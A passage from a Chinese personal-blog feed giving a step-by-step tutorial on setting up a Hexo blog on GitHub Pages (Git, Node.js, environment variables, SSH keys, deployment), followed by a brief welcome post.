，将来你的个人博客的域名就是这个了，是不是很简单<br>3.仓库创建成功后可能会有延迟，也就是可能得等一段时间才能生效</p><h2 id="二、搭建Hexo"><a href="#二、搭建Hexo" class="headerlink" title="二、搭建Hexo"></a>二、搭建Hexo</h2><p>　　Hexo是一款基于Node.js的静态博客框架，依赖少易于安装使用，可以方便的生成静态网页托管在GitHub和Coding上，是搭建博客的首选框架。在Hexo上面有许多现成的个人博客网站模板，安装部署完成后我们可以直接使用，也可以对其进行个性化的改造。Hexo的搭建步骤相比Github的操作复杂了许多，也就是它让我摸索了很长时间，然后可能是由于版本更新，导致网上的老教程都不太靠谱（至少对我来说挺坑的…），然后下面来详细介绍一下搭建步骤，建议在安装过程中关闭杀毒软件，因为会导致某些操作无法成功：</p><p>1.安装Git<br>2.安装Nodejs<br>3.安装Hexo</p><h4 id="1-安装Git"><a href="#1-安装Git" class="headerlink" title="1.安装Git"></a>1.安装Git</h4><p>　　到官网下载Git<a href="https://git-scm.com/downloads" target="_blank" rel="noopener">https://git-scm.com/downloads</a>.安装的时候一路点击Next就行，因为我也不知道都是些啥…反正默认就对了hh</p><h4 id="2-安装Nodejs"><a href="#2-安装Nodejs" class="headerlink" title="2.安装Nodejs"></a>2.安装Nodejs</h4><p>　　这玩意和第三步的网上教程坑死我了…　whatever，首先还是先去官网把它下载下来<a href="https://nodejs.org/zh-cn/" target="_blank" rel="noopener">https://nodejs.org/zh-cn/</a>.然后安装为了防止后面出现乱七八糟的错误还是推荐默认选项，安装位置它要c盘就c盘吧，c盘应该也不缺这么点空间。<br>　　安装完成后，键盘同时按住（WIN+R）呼出运行，输入cmd运行命令提示符，然后输入node -v，如果正常显示版本号既nodejs安装成功，再输入npm -v，同理显示版本号即可。关于npm，npm的作用就是对Node.js依赖的包进行管理，也可以理解为用来安装/卸载Node.js需要装的东西，新版的nodejs自带npm，安装时两者一起安装。<br>　　到此剩下的步骤就是和网上的教程区别最大的地方，根据我一下午的尝试，安装时nodejs会自动在D盘创建一个叫NodeJS的文件夹，里面包括node_global和node_cache这两个子文件夹，（而如果按照网上的教程这两个文件夹需要你自己可选创建，然后还要设置一堆乱七八糟的东西），接下来我们需要设置电脑的环境变量，基本步骤是右键计算机，选择属性，选择左边的高级系统设置，选择环境变量。这里我们应该是需要设置两个地方就行，第一个是上面的用户变量，双击path进入编辑，将带AppData\Roaming\npm的这一行删除，替换为D:\NodeJS\node_global，点击确定即可，第二个是下面的系统变量，新建一个NODE_PATH，然后在下面那行输入D:\NodeJS\node_global\node_modules，点击确定即可。</p><h4 id="3-安装Hexo"><a href="#3-安装Hexo" class="headerlink" title="3.安装Hexo"></a>3.安装Hexo</h4><p>　　鼠标右键点击桌面，如果Git安装成功的话右键菜单中会多出两个选项，选择其中的Git Bash，然后再出现的窗口中输入npm install hexo-cli -g，敲回车，然后在电脑的某个地方新建一个名为hexo的文件夹（名字和位置都随意），但是由于这个文件夹将来就作为你存放网站相关代码的地方，所以最好不要随便放。右键这个文件夹，同样选择Git Bash，输入hexo init，回车，hexo会自动下载一些文件到这个目录，然后我们再打开电脑的环境变量，在下面的系统变量中找到path，双击进入，添加新的一行内容为D:\NodeJS\node_global\node_modules\hexo\bin，然后我们可以在hexo中输入hexo -v，查看版本号同上，然后我们可以输入hexo -g，回车，再输入hexo -s，回车，执行以上命令之后打开浏览器访问 <a href="http://localhost:4000" target="_blank" rel="noopener">http://localhost:4000</a> 即可看到hexo为我们提供的默认页面。</p><h2 id="三、将我们的个人博客上传到Github"><a href="#三、将我们的个人博客上传到Github" class="headerlink" title="三、将我们的个人博客上传到Github"></a>三、将我们的个人博客上传到Github</h2><p>　　此时我们的博客还是存放在本地的，我们如果想能通过我们在第一步获取到的域名访问到该博客，还需将其上传到Github，如果你一切都配置好了，发布上传很容易，在Git Bash中一句hexo d就搞定了，当然关键还是你要把所有东西配置好。<br>　　首先我们需要配置ssh Key，在Git Bash中输入cd ~/.ssh，如果提示：No such file or directory 说明我们是第一次使用Git，表示正常，然后我们再输入$ ssh-keygen -t rsa -C “你在Github上注册时使用的邮箱地址”，然后git会输出：</p><p>Generating public/private rsa key pair.<br>Enter file in which to save the key (/Users/your_user_directory/.ssh/id_rsa):</p><p>这两句话，敲回车就好，再然后系统会要你输入密码，这个密码会在你提交项目时使用，如果为空的话提交项目时则不用输入。这个设置是防止别人往你的项目里提交内容。我输入密码时好像看不到输入了啥…应该两次输的一样就行。最后看到一个框框中间一堆符号就说明成功设置ssh key了。<br>　　接下里我们需要将ssh Key添加到Github，在类似于C:\Users\16875.ssh的文件夹中你会看到一个id_rsa.pub文件，用记事本将其打开复制其中的所有内容，如果看不到这个文件，你可能需要设置显示隐藏文件。准确的复制这个文件的内容，才能保证设置的成功。然后登陆Github，点击右上角的 Account Settings—-&gt;SSH Public keys —-&gt; add another public keys，把你本地生成的密钥复制到里面（key文本框中）， 点击 add key 就ok了。<br>　接下来我们可以测试一下设置是否成功，在Git Bash中输入$ ssh -T <a href="mailto:git@github.com">git@github.com</a>，如果响应以下内容：</p><p>The authenticity of host ‘github.com (207.97.227.239)’ can’t be established.<br>RSA key fingerprint is 16:27:ac:a5:76:28:2d:36:63:1b:56:4d:eb:df:a6:48.<br>Are you sure you want to continue connecting (yes/no)?</p><p>接着输入yes，然后你就会看到一条确认成功的语句。<br>　　最后，我们还需要完善我们的个人信息，Git会根据用户的名字和邮箱来记录提交。GitHub也是用这些信息来做权限的处理，输入下面的代码进行个人信息的设置，把名称和邮箱替换成你在Github上注册时的，名字注意不是昵称是用户名。</p><p>$ git config –global user.name “C-0-RE”//用户名<br>$ git config –global user.email  “<a href="mailto:C-0-RE@gmail.com">C-0-RE@gmail.com</a>“//填写自己的邮箱</p><p>到此ssh Key配置就已全部完成。<br>　　最后的最后，我们要打开hexo文件夹，里面有一个名为_config.yml的文件，推荐用sublime打开，翻到文件的最下面，修改其中deploy的部分为如下：</p><p>deploy:<br>　　type: git<br>　　repository: <a href="mailto:git@github.com">git@github.com</a>:你Github的用户名/你Github的用户名.github.io.git<br>　　branch: master</p><p> 然后保存，关闭文件，再打开Git Bash输入一条命令npm install hexo-deployer-git –save，该命令用来安装一个插件，辅助提交。最后如本段开头所说的，输入hexo d，即可将本次有改动的代码全部提交，没有改动的不会。</p><h2 id="四、结语"><a href="#四、结语" class="headerlink" title="四、结语"></a>四、结语</h2><p>　　至此，应该就可以通过类似于 <a href="http://c-0-re.github.io" target="_blank" rel="noopener">http://c-0-re.github.io</a> 的域名直接访问我们的个人博客了。“广阔天地，大有作为”，即使是这样一个十分简单的博客，也还有许多可以让我们发挥创造、学习、修改的地方。</p><p>最后附上常用的hexo命令：<br>hexo new “postName” #新建文章<br>hexo new page “pageName” #新建页面<br>hexo generate #生成静态页面至public目录<br>hexo server #开启预览访问端口（默认端口4000，’ctrl + c’关闭server）<br>hexo deploy #部署到GitHub<br>hexo help  # 查看帮助<br>hexo version  #查看Hexo的版本</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Welcome To My Blog</title>
      <link href="/2020/06/05/welcome-to-my-blog/"/>
      <url>/2020/06/05/welcome-to-my-blog/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h3 id="New-start"><a href="#New-start" class="headerlink" title="New start,"></a><em>New start</em>,</h3><h3 id="New-journey-Let’s-do-something"><a href="#New-journey-Let’s-do-something" class="headerlink" title="　　　New journey.　　　　 Let’s do something."></a>　　　<em>New journey</em>.　　　　 <em>Let’s do something</em>.</h3>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
